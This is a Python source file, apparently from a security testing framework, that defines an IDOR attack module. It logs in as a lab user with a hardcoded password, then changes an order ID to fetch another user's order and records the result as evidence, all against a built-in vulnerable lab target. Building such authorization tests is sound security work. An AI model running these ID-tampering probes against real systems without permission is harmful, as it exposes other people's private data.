# Insecure Direct Object Reference (IDOR) Attack Module.
# Formulated according to target definition, evidence store, and deterministic validation.

from typing import Optional
from raven.core.models import AttackResult, Evidence, Observation
from raven.core.store import EvidenceStore
from raven.core.validator import FindingValidator
from raven.target.base import BaseTarget, TargetRequest
from .base import AttackModule


class IDORAttack(AttackModule):
    id = "idor"
    name = "Insecure Direct Object Reference"
    category = "authorization"
    description = "Tests for broken object-level authorization by tampering with sequential resource IDs."
    prerequisite = ["authenticated_session"]
    capabilities = ["endpoint_fuzzing", "parameter_manipulation", "cross_user_verification"]

    def execute(
        self,
        target: BaseTarget,
        store: Optional[EvidenceStore] = None,
    ) -> AttackResult:
        evidence_store = store or EvidenceStore()
        telemetry: list[Observation] = []
        collected_evidence: list[Evidence] = []

        # Step 0: Obtain authenticated session (Alice)
        telemetry.append(Observation(
            step="AUTHENTICATE",
            action="POST /api/auth/login",
            details={"user": "alice"},
        ))
        login_resp = target.handle_request(TargetRequest(
            method="POST",
            path="/api/auth/login",
            body={"username": "alice", "password": "alicepassword123"},
        ))

        login_data = login_resp.get_json() or {}
        token = login_data.get("token")
        if not token:
            return AttackResult(
                attack_id=self.id,
                attack_name=self.name,
                success=False,
                status="PREREQUISITE_FAILED",
                error_message="Authentication failed to return session token.",
            )

        auth_headers = {"Authorization": f"Bearer {token}"}

        # Step 1: Baseline Request (Alice accessing her own order 101)
        telemetry.append(Observation(
            step="BASELINE_PROBE",
            action="GET /api/orders/101",
            details={"expected_owner": "usr_alice", "actor": "usr_alice"},
        ))
        req_101 = TargetRequest(method="GET", path="/api/orders/101", headers=auth_headers)
        resp_101 = target.handle_request(req_101)
        body_101 = resp_101.get_json() or {}

        e1 = Evidence(
            id=evidence_store.next_id(),
            evidence_type="HTTP_BASELINE_ACCESS",
            request_method="GET",
            request_path="/api/orders/101",
            request_headers=auth_headers,
            request_body=None,
            response_status=resp_101.status_code,
            response_body=body_101,
            authenticated_actor="usr_alice",
            resource_owner=body_101.get("owner_id"),
            observation="Legitimate authenticated access to self-owned resource (order 101).",
        )
        evidence_store.add_evidence(e1)
        collected_evidence.append(e1)

        # Step 2: Parameter Manipulation / Tampering (Alice requesting Bob's order 102)
        telemetry.append(Observation(
            step="TAMPER_PARAMETER",
            action="GET /api/orders/102",
            details={"tested_id": "102", "actor": "usr_alice"},
        ))
        req_102 = TargetRequest(method="GET", path="/api/orders/102", headers=auth_headers)
        resp_102 = target.handle_request(req_102)
        body_102 = resp_102.get_json() or {}

        owner_102 = body_102.get("owner_id") if resp_102.status_code == 200 else None
        obs_text = (
            f"Cross-user resource returned! User 'usr_alice' received data belonging to '{owner_102}'."
            if resp_102.status_code == 200 and owner_102 == "usr_bob"
            else f"Access denied or not found: HTTP {resp_102.status_code}."
        )

        e2 = Evidence(
            id=evidence_store.next_id(),
            evidence_type="HTTP_TAMPER_ACCESS",
            request_method="GET",
            request_path="/api/orders/102",
            request_headers=auth_headers,
            request_body=None,
            response_status=resp_102.status_code,
            response_body=body_102,
            authenticated_actor="usr_alice",
            resource_owner=owner_102,
            observation=obs_text,
        )
        evidence_store.add_evidence(e2)
        collected_evidence.append(e2)

        # Step 3: Deterministic Finding Validation
        finding = FindingValidator.validate_idor(collected_evidence)
        findings = [finding] if finding else []
        if finding:
            evidence_store.add_finding(finding)

        is_success = finding is not None
        status_str = "VULNERABILITY_CONFIRMED" if is_success else "VULNERABILITY_NOT_DETECTED"

        return AttackResult(
            attack_id=self.id,
            attack_name=self.name,
            success=is_success,
            status=status_str,
            evidence=collected_evidence,
            findings=findings,
            telemetry=telemetry,
        )


if __name__ == "__main__":
    from raven.target.lab import VulnerableLabTarget
    attack = IDORAttack()
    lab = VulnerableLabTarget()
    res = attack.execute(lab)
    print(f"Attack: {res.attack_name} | Success: {res.success} | Status: {res.status}")
    for ev in res.evidence:
        print(f"[{ev.id}] {ev.request_method} {ev.request_path} -> {ev.response_status} | {ev.observation}")